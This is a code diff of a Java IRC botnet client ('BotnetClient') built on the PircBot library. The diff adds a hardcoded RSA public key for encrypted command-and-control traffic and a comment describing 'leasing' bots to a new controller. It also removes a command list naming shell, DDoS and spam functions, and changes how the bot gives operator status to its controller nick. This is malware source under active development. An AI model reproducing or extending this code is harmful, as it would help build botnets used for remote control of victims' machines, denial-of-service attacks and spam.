@@ -11,10 +11,16 @@ import javax.mail.internet.*;
 
 import org.jibble.pircbot.*;
 
+
+/*
+ * lease newCC time numBots
+ * 	- send a private message with a private key to newCC
+ *  - send public key to other bots
+ */
+
+
+
 public class BotnetClient extends PircBot {
-	private static final String[] COMMANDS = {"shell", "ddos", "spam", "lease"};
-	private static final String[] LEASE_COMMANDS = {"ddos", "spam"};
-	
 	private static final String SENTINEL = "$: ";
 	private static final String TERMINATION = "exit";
 	private static final boolean DEBUG = true;
@@ -28,16 +34,14 @@ public class BotnetClient extends PircBot {
 	private static final int PORT = 6667;
 	private String uuid;
 	private String id;
-	private String operator;
-
-	private Key startKey;
-	
-	private Key privKey;
 	
 	private MsgEncrypt m;
 	
+	private String rsaMod = "8406584928969230912194776015676041377044384281902059425892455383226755881066602094231727976096331374098875813287829766341473134627956293747440322615391837";
+	private String rsaPublicExp = "65537";
+	
 	private boolean leased = false;
-	private final int TIME = 3000; // Time in milliseconds
+	private int TIME = 3000; // Time in milliseconds
 	private long startTime;
 	private MsgEncrypt leasedM; // This will be set to null when time is up
 	
@@ -46,6 +50,8 @@ public class BotnetClient extends PircBot {
 	}
 	
 	public BotnetClient() {
+		m = MsgEncrypt.getInstance();
+		m.genRSAPubKey(rsaMod + " " + rsaPublicExp);
 		uuid = UUID.randomUUID().toString();
 		id = NAME + "_" + uuid;
 		try {
@@ -160,10 +166,6 @@ public class BotnetClient extends PircBot {
 		}
 	}
 	
-	protected void onOp(String channel, String sourceNick, String sourceLogin, String sourceHostname, String recipient) {
-		operator = recipient;
-	}
-	
 	protected void onJoin(String channel, String sender, String login, String hostname) {
 		if (sender.equals(CC)) {
 			op(CHANNEL, sender);
@@ -238,7 +240,6 @@ public class BotnetClient extends PircBot {
 						//System.out.println("key: " + otherKey);
 						String info = chat.readLine();
 						//System.out.println("info: " + info);
-						m = MsgEncrypt.getInstance();
 						m.setPubParams(info);
 						m.handShake(otherKey);
 						chat.sendLine(m.getStrKey().replace("\r\n", "_").replace("\r", "-").replace("\n", "::"));
